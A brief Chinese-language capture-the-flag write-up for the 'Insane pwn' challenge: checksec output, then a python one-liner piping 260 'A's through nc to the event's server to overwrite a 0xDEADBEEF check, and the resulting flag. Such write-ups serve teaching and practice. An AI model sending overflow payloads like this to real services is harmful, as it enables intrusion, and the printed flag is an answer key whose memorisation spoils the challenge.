Insane pwn题目描述：
There supposed to be some uncrackable badass pwn, but, you know, all this festive mood around and i am a kind fellow, so just for this time take easy one instead...let it be our little secret. Happy New Year! :)

按照惯例运行一下发现
Hello! I am x86 vulnerable programm and have and inner buffer size of 256 bites
Can you lead me to segmentation fault please?
1234
Hit me harder!

查看一下保护手段
$ checksec ./insane_pwn
[*] '/home/ubuntu/Desktop/insane_pwn'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

发现全部保护都开着
立即推，放弃比赛

当然不可以，仔细分析一下程序就可以得到只需输入260个字符即可覆盖0xDEADBEEF从而获取输出的flag

# python -c "print 'A'*260" |  nc tasks.open.kksctf.ru 10003
# kks{W0w_th15_w@5_4w350m3!}


tips:
gdb
disass func_name
